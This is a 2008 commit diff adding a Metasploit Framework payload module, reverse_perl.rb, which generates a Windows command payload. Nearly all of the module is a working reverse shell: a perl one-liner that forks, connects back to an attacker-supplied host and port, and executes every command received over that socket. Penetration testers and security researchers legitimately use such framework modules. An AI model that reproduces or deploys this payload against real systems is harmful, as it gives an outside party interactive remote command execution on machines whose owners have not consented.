6cb21b2dc78d02fa570c6f66f0cc260abafcd97a
Patrick Webster <patrick@aushack.com>
2008-04-03 09:36:01 +0000

    Windows port of the Perl based cmd payloads
    git-svn-id: file:///home/svn/framework3/trunk@5465 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/cmd/windows/reverse_perl.rb
@@ -0,0 +1,65 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/command_shell'
+
+module Msf
+module Payloads
+module Singles
+module Cmd
+module Windows
+
+module ReversePerl
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Windows Command, Double reverse TCP connection (via perl)',
+			'Version'       => '$Revision$',
+			'Description'   => 'Creates an interactive shell via perl',
+			'Author'        => ['cazz', 'patrick'],
+			'License'       => BSD_LICENSE,
+			'Platform'      => 'win',
+			'Arch'          => ARCH_CMD,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Session'       => Msf::Sessions::CommandShell,
+			'PayloadType'   => 'cmd',
+			'Payload'       =>
+				{
+					'Offsets' => { },
+					'Payload' => ''
+				}
+			))
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + command_string
+	end
+	
+	#
+	# Returns the command string to use for execution
+	#
+	def command_string
+
+		cmd = "perl -MIO -e \"$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\\\"#{datastore['LHOST']}:#{datastore['LPORT']}\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\""
+
+	end
+
+end
+
+end end end end end
